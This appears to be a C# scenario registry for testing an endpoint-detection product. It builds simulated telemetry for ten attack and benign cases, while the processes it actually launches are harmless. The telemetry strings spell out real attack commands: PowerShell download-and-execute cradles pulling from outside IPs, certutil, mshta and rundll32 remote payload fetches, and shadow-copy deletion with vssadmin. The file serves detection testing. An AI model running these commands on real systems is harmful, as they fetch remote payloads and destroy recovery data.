using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;

namespace Phalanx.Cockpit.Scenarios;

public sealed class AttackScenario
{
    public int Id { get; init; }
    public string Name { get; init; } = string.Empty;
    public string Description { get; init; } = string.Empty;
    public string ExpectedAction { get; init; } = "ACTION_KILL"; // "ACTION_KILL" | "ACTION_RESUME"
    public string TargetProcess { get; init; } = string.Empty;
    public string ParentProcess { get; init; } = string.Empty;
    public string MitreTactic { get; init; } = string.Empty;
    public string CommandLine { get; init; } = string.Empty;
    public string AttackType { get; init; } = string.Empty;
    public string ContextScenario { get; init; } = string.Empty;
    public string DefenseGoal { get; init; } = string.Empty;
    public Func<uint, TelemetryBatch> BuildBatch { get; init; } = null!;
    public Func<ProcessStartInfo?>? GetSafeOsProcessInfo { get; init; }
    public Func<ProcessStartInfo?>? GetLiveProcessInfo { get; init; }
}

public static class AttackScenarioRegistry
{
    private static readonly Random Rnd = new();

    public static uint GeneratePid() => (uint)Rnd.Next(10000, 60000);

    public static readonly AttackScenario CustomStudioScenario = new()
    {
        Id = 99,
        Name = @"커스텀 페이로드 공작소 (Ad-hoc)",
        Description = @"사용자 정의 모의 공격 페이로드",
        ExpectedAction = @"CUSTOM",
        TargetProcess = @"사용자 지정",
        ParentProcess = @"사용자 지정",
        MitreTactic = @"User Defined",
        CommandLine = @"User Defined Command Line",
        AttackType = @"사용자 정의 모의 공격 페이로드",
        ContextScenario = @"보안 연구원 또는 침투 테스터가 직접 부모/타깃 프로세스, MITRE 전술, 실행 명령줄을 설계하여 Phalanx EDR의 탐지 및 자율 수사 능력을 시험하는 맞춤형 공작소입니다.",
        DefenseGoal = @"임의의 공격 조합에 대해 EDR 파이프라인의 동결, 수사관 연동, 최종 처분 프로세스를 유연하게 검증합니다.",
        BuildBatch = _ => new TelemetryBatch()
    };

    public static IReadOnlyList<AttackScenario> AllScenarios { get; } = new List<AttackScenario>
    {
        // --------------------------------------------------------------------
        // [1] Office LOLBAS C2 Dropper
        // --------------------------------------------------------------------
        new()
        {
            Id = 1,
            Name = "Office LOLBAS C2 Dropper",
            Description = "winword.exe ➔ powershell.exe -enc <C2 다운로더> (24μs 선제 동결 ➔ ReAct 3턴 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"powershell.exe",
            ParentProcess = @"winword.exe",
            MitreTactic = @"T1059.001",
            CommandLine = @"powershell.exe -w hidden -enc JABjAGwAYQBzAHMAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOw...",
            AttackType = @"오피스 매크로 경유 C2 다운로더 (Living-off-the-Land)",
            ContextScenario = @"스피어 피싱 메일에 첨부된 Word 문서(.docm) 열람 시, 인라인 VBA 매크로가 백그라운드 숨김 창(-w hidden)으로 PowerShell을 기동하여 외부 C2 서버(185.220.101.5)에서 2차 페이로드를 다운로드하려는 침해 상황입니다.",
            DefenseGoal = @"비인가 오피스 자식 프로세스를 선제 동결하고, 난독화된 명령줄을 해독하여 C2 통신을 확증한 뒤 프로세스를 격리 사살합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 3104;
                string script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://185.220.101.5/payload.ps1')";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                // 1. 부모 오피스 프로세스 스냅샷
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "winword.exe",
                    CommandLine = "winword.exe 2026_09_invoice.docm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                // 2. 동결된 의심 자식 프로세스
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-w hidden -NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [2] Ransomware Shadow Copy Deletion
        // --------------------------------------------------------------------
        new()
        {
            Id = 2,
            Name = "Ransomware Shadow Copy Deletion",
            Description = "vssadmin.exe delete shadows /all /quiet (C++ 로컬 룰 엔진 0.1ms 현장 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"vssadmin.exe",
            ParentProcess = @"cmd.exe",
            MitreTactic = @"T1490",
            CommandLine = @"vssadmin.exe delete shadows /all /quiet",
            AttackType = @"랜섬웨어 복원 무력화 (볼륨 섀도우 복사본 일괄 영구 삭제)",
            ContextScenario = @"랜섬웨어가 호스트 시스템의 주요 파일을 암호화하기 직전, 피해자가 Windows 백업 복원 지점으로 롤백하지 못하도록 vssadmin 유틸리티를 호출하여 복원 지점을 일괄 삭제(/all /quiet)하려는 파괴적 침해 상황입니다.",
            DefenseGoal = @"호스트 데이터 복원력을 보존하기 위해 파일이 암호화되기 전 커널 레벨에서 즉각 현장 사살(Reflex Kill)하여 복원 지점 삭제를 원천 차단합니다.",
            BuildBatch = targetPid =>
            {
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = 1000,
                    ImageName = "vssadmin.exe",
                    CommandLine = "vssadmin.exe delete shadows /all /quiet",
                    IsSuspended = false,
                    IsTerminated = true,
                    Lifecycle = ProcessLifecycle.LifecycleTerminated
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Simulated vssadmin] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                // 호스트 복원 지점 파괴를 방지하기 위해 안전한 vssadmin list shadows 쿼리로 치환 실행
                FileName = "cmd.exe",
                Arguments = "/c vssadmin list shadows & timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [3] LOLBAS CertUtil Remote Payload Download
        // --------------------------------------------------------------------
        new()
        {
            Id = 3,
            Name = "LOLBAS CertUtil Remote Payload Download",
            Description = "excel.exe ➔ certutil.exe -urlcache -split -f http://... (24μs 동결 ➔ 위협 평판 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"certutil.exe",
            ParentProcess = @"excel.exe",
            MitreTactic = @"T1105",
            CommandLine = @"certutil.exe -urlcache -split -f http://185.220.101.5/stage2.hta C:\Windows\Temp\stage2.hta",
            AttackType = @"Windows 내장 인증서 유틸리티 악용 인그레스 페이로드 인출",
            ContextScenario = @"공격자가 백신 네트워크 다운로드 차단을 우회하기 위해, Microsoft 정품 인증서 관리 도구인 certutil.exe의 캐시 다운로드 기능(-urlcache -split -f)을 악용하여 외부 서버에서 악성 2차 페이로드를 받아오려는 상황입니다.",
            DefenseGoal = @"정규 도구의 비정상 다운로드 행위를 포착하여 선제 동결한 후, 외부 IP 위협 평판 조회를 통해 악성 인출임을 확증하고 프로세스 사살 및 C2 IP를 방화벽에 차단합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 2208;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "excel.exe",
                    CommandLine = "excel.exe budget_2026.xlsm",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "certutil.exe",
                    CommandLine = "certutil.exe -urlcache -split -f http://185.220.101.5/malware.exe C:\\Windows\\Temp\\malware.exe",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Live CertUtil Download] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [4] Browser Drive-by HTA Attack
        // --------------------------------------------------------------------
        new()
        {
            Id = 4,
            Name = "Browser Drive-by HTA Attack",
            Description = "msedge.exe ➔ mshta.exe http://... (24μs 동결 ➔ 킬체인 매핑 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"mshta.exe",
            ParentProcess = @"msedge.exe",
            MitreTactic = @"T1218.005",
            CommandLine = @"mshta.exe http://185.220.101.5/calc.hta",
            AttackType = @"웹 브라우저 경유 악성 HTA 스크립트 실행 (Drive-by Execution)",
            ContextScenario = @"사용자가 악성 광고(Malvertising)나 피싱 웹페이지를 방문했을 때, 웹 브라우저가 사용자 개입 없이 Windows 내장 HTML 호스트인 mshta.exe를 분기하여 원격 서버의 HTA 페이로드를 직접 실행하려는 상황입니다.",
            DefenseGoal = @"웹 브라우저가 스크립트 호스트를 스폰하는 이상 트리 계통을 동결하고, MITRE ATT&CK T1218.005 공격 기법으로 식별하여 브라우저 탈취 시도를 차단합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 5120;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "msedge.exe",
                    CommandLine = "msedge.exe https://trusted-portal.com",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "mshta.exe",
                    CommandLine = "mshta.exe http://185.220.101.5/invoice.hta",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c echo [Live HTA Emulation] && timeout /t 10",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [5] Masquerading Dropper (T1036.005)
        // --------------------------------------------------------------------
        new()
        {
            Id = 5,
            Name = "Masquerading Dropper (T1036.005)",
            Description = "explorer.exe ➔ powershell.exe -enc ... ➔ Temp\\svchost.exe (5턴 심층 수사 ➔ 사살 및 방화벽 차단)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"svchost.exe",
            ParentProcess = @"powershell.exe",
            MitreTactic = @"T1036.005",
            CommandLine = @"C:\Users\user\AppData\Local\Temp\svchost.exe -daemon",
            AttackType = @"시스템 핵심 프로세스명 위장 드로퍼 (Path Anomaly & Dropper)",
            ContextScenario = @"침투한 공격자가 정상 셸(explorer.exe)에서 파워셸을 이용해 Windows 핵심 프로세스인 svchost.exe와 동일한 이름으로 임시 폴더(C:\Windows\Temp\)에 무서명 악성 바이너리를 생성하고 백그라운드 서비스로 상주하려는 상황입니다.",
            DefenseGoal = @"정규 경로(System32)를 벗어난 시스템 바이너리 파일 생성을 감지하고, 위장 공격을 식별하여 악성 프로세스 사살 및 C2 방화벽 차단을 수행합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "(New-Object Net.WebClient).DownloadFile('http://198.51.100.99/update.dat', 'C:\\Windows\\Temp\\svchost.exe'); Start-Process 'C:\\Windows\\Temp\\svchost.exe'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -w hidden -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });

                // Clean-Room 가상 주입 시 Temp\svchost.exe 모의 파일 텔레메트리 등록 (무서명 시스템 경로 위장 T1036.005)
                FileInspectionTool.RegisterSimulatedFile(@"C:\Windows\Temp\svchost.exe", new FileInspectionTool.SimulatedFileEntry(
                    Exists: true,
                    FileSizeBytes: 124928L,
                    Sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                    Entropy: 7.4521,
                    IsSigned: false,
                    SignerSubject: string.Empty,
                    SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
                    IsPathMasqueraded: true,
                    IsDisguisedExecutable: false,
                    AnomalyScore: 100,
                    DiagnosticReason: "시스템 핵심 바이너리 파일명이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
                ));

                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () =>
            {
                // 실제 OS 디스크에 C:\Windows\Temp\svchost.exe를 생성(비파괴 무해 더미 바이너리)하고 대기하여
                // FileInspectionTool 부재 시의 파일 검증 한계를 직접 실증
                string tempDir = Environment.GetEnvironmentVariable("TEMP") ?? @"C:\Windows\Temp";
                string targetFile = Path.Combine(tempDir, "svchost.exe");
                string psScript = $"[IO.File]::WriteAllText('{targetFile.Replace("\\", "\\\\")}', 'MZ_SIMULATED_PE_PAYLOAD'); Start-Sleep -Seconds 30";
                return new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-NoProfile -Command \"{psScript}\"",
                    CreateNoWindow = true,
                    UseShellExecute = false
                };
            }
        },

        // --------------------------------------------------------------------
        // [6] Benign Administrative Script (Known-Good)
        // --------------------------------------------------------------------
        new()
        {
            Id = 6,
            Name = "Benign Admin Script (Known-Good)",
            Description = "explorer.exe ➔ powershell.exe -enc <Get-Service *.internal> (사내 백업 점검 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            TargetProcess = @"powershell.exe",
            ParentProcess = @"explorer.exe",
            MitreTactic = @"Known-Good",
            CommandLine = @"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",
            AttackType = @"정상 관리자 유지보수 스크립트 (오탐 방지 및 정상 복구 검증)",
            ContextScenario = @"사내 전산 관리자 또는 정상 자동화 도구가 시스템 점검 및 서비스 가동 상태 확인(Get-Service)을 위해 파워셸 명령을 실행한 상황으로, 악의적 의도가 없는 합법적인 관리 작업입니다.",
            DefenseGoal = @"스크립트 실행이 감지되더라도 명령줄 인자와 대상 작업이 무해한 읽기 전용 작업임을 AI 수사관이 정확히 판정하여 오탐 사살을 방지하고 정상 복구(ACTION_RESUME)를 집행합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                string script = "Get-Service -Name '*backup*' | Select-Object Name, Status | Out-File -FilePath '\\\\fileserver.corp.local\\logs\\status.log'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -NoProfile -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Get-Process; Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [7] SCCM Maintenance Script (False Positive Evasion)
        // --------------------------------------------------------------------
        new()
        {
            Id = 7,
            Name = "SCCM Maintenance Script (False Positive Evasion)",
            Description = "taskhostw.exe ➔ powershell.exe -enc <Base64 WMI Hotfix Audit> (사내 패치 점검 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            TargetProcess = @"powershell.exe",
            ParentProcess = @"taskhostw.exe",
            MitreTactic = @"Known-Good",
            CommandLine = @"powershell.exe -ExecutionPolicy Bypass -NoProfile -enc <Base64 WMI Hotfix Audit>",
            AttackType = @"사내 전산 관리자 정규 유지보수 및 핫픽스 감사 스크립트 (오탐 방지 검증)",
            ContextScenario = @"정규 시스템 작업 스케줄러(taskhostw.exe)가 관리자 권한으로 사내 패치 감사 스크립트를 Base64 인코딩으로 실행한 상황입니다. 명령줄 난독화가 존재하나 외부 C2 통신이 없고 사내 감사 로그(\\corp-sccm.internal)만 갱신하는 합법적 작업입니다.",
            DefenseGoal = @"스크립트 실행이 감지되더라도 명령줄 인자와 대상 작업이 무해한 사내 감사 작업임을 AI 수사관이 정확히 판정하여 오탐 사살을 방지하고 정상 복구(ACTION_RESUME)를 집행합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 1040;
                string script = "Get-WmiObject -Class Win32_QuickFixEngineering | Where-Object {$_.HotFixID} | Select-Object HotFixID, InstalledOn | Out-File -FilePath '\\\\corp-sccm.internal\\patches\\audit.log'";
                string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));
                string fullCmd = $"powershell.exe -ExecutionPolicy Bypass -NoProfile -enc {b64}";

                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "taskhostw.exe",
                    CommandLine = "C:\\Windows\\system32\\taskhostw.exe {2227A293-AE67-4503-A5B1-E94A36CE2FBF}",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "powershell.exe",
                    CommandLine = fullCmd,
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Get-WmiObject Win32_QuickFixEngineering; Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [8] Developer Toolchain Loopback IPC (Known-Good)
        // --------------------------------------------------------------------
        new()
        {
            Id = 8,
            Name = "Developer Toolchain Loopback IPC (Known-Good)",
            Description = "code.exe ➔ curl.exe -s http://127.0.0.1:8080/health (로컬 개발 서버 헬스체크 ➔ 무해성 검증 후 정상 복구)",
            ExpectedAction = "ACTION_RESUME",
            TargetProcess = @"curl.exe",
            ParentProcess = @"code.exe",
            MitreTactic = @"Known-Good",
            CommandLine = @"curl.exe -s http://127.0.0.1:8080/health -o C:\Users\user\AppData\Local\Temp\health.json",
            AttackType = @"개발자 IDE 환경 내 로컬 루프백 마이크로서비스 IPC 통신 (개발자 워크플로우 보존)",
            ContextScenario = @"개발자 도구인 VS Code가 로컬 웹 개발 서버 가동 상태를 확인하기 위해 명령어 셸을 거쳐 curl로 127.0.0.1 루프백 주소에 헬스체크 쿼리를 수행한 상황입니다.",
            DefenseGoal = @"외부 네트워크 유출이 아닌 로컬 루프백(127.0.0.1) IPC 통신임을 AI 수사관이 식별하여 개발자 생산성을 저해하지 않고 즉시 원자적 동결을 해제(ACTION_RESUME)합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 2480;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 1000,
                    ImageName = "code.exe",
                    CommandLine = "C:\\Program Files\\Microsoft VS Code\\Code.exe --unity-launch",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "curl.exe",
                    CommandLine = "curl.exe -s http://127.0.0.1:8080/health -o C:\\Users\\user\\AppData\\Local\\Temp\\health.json",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [9] LOLBAS Rundll32 Proxy Execution (T1218.011)
        // --------------------------------------------------------------------
        new()
        {
            Id = 9,
            Name = "LOLBAS Rundll32 Proxy Execution (T1218.011)",
            Description = "explorer.exe ➔ rundll32.exe javascript:... (파워셸 감시 회피 ➔ 24μs 동결 ➔ 위협 평판 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"rundll32.exe",
            ParentProcess = @"explorer.exe",
            MitreTactic = @"T1218.011",
            CommandLine = @"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:http://185.220.101.5/beacon.sct"")",
            AttackType = @"Windows 정품 서명 바이너리(Rundll32) 악용 C2 스크립트릿 인출",
            ContextScenario = @"공격자가 파워셸 감시 및 AMSI 스크립트 차단을 회피하기 위해, 정상 서명 바이너리인 rundll32.exe에 RunHTMLApplication을 호출하여 외부 악성 C2(185.220.101.5)로부터 원격 COM 스크립트릿(.sct)을 로드하려는 상황입니다.",
            DefenseGoal = @"신뢰 바이너리를 악용한 우회 공격을 포착하여 선제 동결하고, 외부 C2 평판 조회 및 MITRE T1218.011 공격 기법으로 확증하여 즉각 사살 및 C2 방화벽 차단을 집행합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 1000;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "explorer.exe",
                    CommandLine = "C:\\Windows\\explorer.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "rundll32.exe",
                    CommandLine = "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://185.220.101.5/beacon.sct\")",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });
                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "rundll32.exe",
                Arguments = "user32.dll,MessageBeep",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        },

        // --------------------------------------------------------------------
        // [10] Process Injection via Unbacked Memory (T1055)
        // --------------------------------------------------------------------
        new()
        {
            Id = 10,
            Name = "Process Injection via Unbacked Memory (T1055)",
            Description = "spoolsv.exe (정상 명령줄 위장) ➔ VAD 인메모리 DLL 인젝션 (24μs 동결 ➔ VAD 스캔 ➔ 사살)",
            ExpectedAction = "ACTION_KILL",
            TargetProcess = @"spoolsv.exe",
            ParentProcess = @"services.exe",
            MitreTactic = @"T1055",
            CommandLine = @"C:\Windows\System32\spoolsv.exe",
            AttackType = @"정상 윈도우 인쇄 스풀러 프로세스 내 은닉 인메모리 DLL 인젝션",
            ContextScenario = @"명령줄과 디스크 바이너리는 완전히 정상적인 윈도우 시스템 서비스(spoolsv.exe)로 위장하고 있으나, 공격자가 가상 메모리 상에 비인가 실행 영역(PAGE_EXECUTE_READWRITE)을 주입하여 LockBit C2(194.165.16.11)로 백도어 통신을 시도하는 고난도 파일리스 침해 상황입니다.",
            DefenseGoal = @"명령줄의 결백함에 속지 않고 VAD 메모리 스캔 도구를 통해 인메모리 Unbacked 실행 영역과 C2 IP를 현장 적발하여 프로세스를 격리 사살하고 침해를 원천 차단합니다.",
            BuildBatch = targetPid =>
            {
                uint ppid = 680;
                var batch = new TelemetryBatch();
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = ppid,
                    ParentProcessId = 0,
                    ImageName = "services.exe",
                    CommandLine = "C:\\Windows\\system32\\services.exe",
                    Lifecycle = ProcessLifecycle.LifecycleSnapshot
                });
                batch.ProcessEvents.Add(new ProcessEvent
                {
                    ProcessId = targetPid,
                    ParentProcessId = ppid,
                    ImageName = "spoolsv.exe",
                    CommandLine = "C:\\Windows\\System32\\spoolsv.exe",
                    IsSuspended = true,
                    Lifecycle = ProcessLifecycle.LifecycleSuspended
                });

                // Clean-Room 가상 주입 시 VAD 메모리 인젝션 및 C2 비콘 모의 텔레메트리 등록
                ProcessMemoryScanTool.RegisterSimulatedMemory(targetPid, new SimulatedMemoryEntry(
                    BaseAddress: 0x0000021A4B000000,
                    RegionSize: 65536,
                    Protect: "PAGE_EXECUTE_READWRITE",
                    MemoryType: "MEM_PRIVATE (Unbacked Code Cave / Reflective DLL)",
                    InjectedHeader: "Reflective DLL (MZ Header Detected)",
                    ExtractedIps: new List<string> { "194.165.16.11" },
                    ExtractedUrls: new List<string> { "http://194.165.16.11/beacon" },
                    DetectedKeywords: new List<string> { "virtualalloc", "createremotethread", "reflective dll", "beacon" }
                ));

                return batch;
            },
            GetSafeOsProcessInfo = () => new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/c timeout /t 15",
                CreateNoWindow = true,
                UseShellExecute = false
            },
            GetLiveProcessInfo = () => new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = "-NoProfile -Command \"Start-Sleep -Seconds 30\"",
                CreateNoWindow = true,
                UseShellExecute = false
            }
        }
    };

    public static AttackScenario? FindById(int id) => id == 99 ? CustomStudioScenario : AllScenarios.FirstOrDefault(s => s.Id == id);
}
